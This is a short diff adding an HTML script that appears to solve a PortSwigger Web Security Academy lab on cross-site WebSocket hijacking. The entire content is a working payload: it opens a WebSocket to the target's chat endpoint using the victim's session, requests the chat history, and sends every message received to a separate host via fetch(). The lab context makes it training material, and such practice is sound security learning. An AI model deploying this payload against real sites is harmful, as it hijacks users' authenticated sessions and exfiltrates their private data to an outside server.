@@ -1,0 +1,13 @@
+
+<script>
+// https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking/lab
+websocket = new WebSocket('wss://ac751fa71eefd9d2802f073300790020.web-security-academy.net/chat')
+websocket.onopen = start
+websocket.onmessage = handleReply
+function start(event) {
+  websocket.send("READY");
+}
+function handleReply(event) {
+  fetch('https://ac581f901ef1d98b80d5078a014b0065.web-security-academy.net/?'+event.data, {mode: 'no-cors'})
+}
+</script>
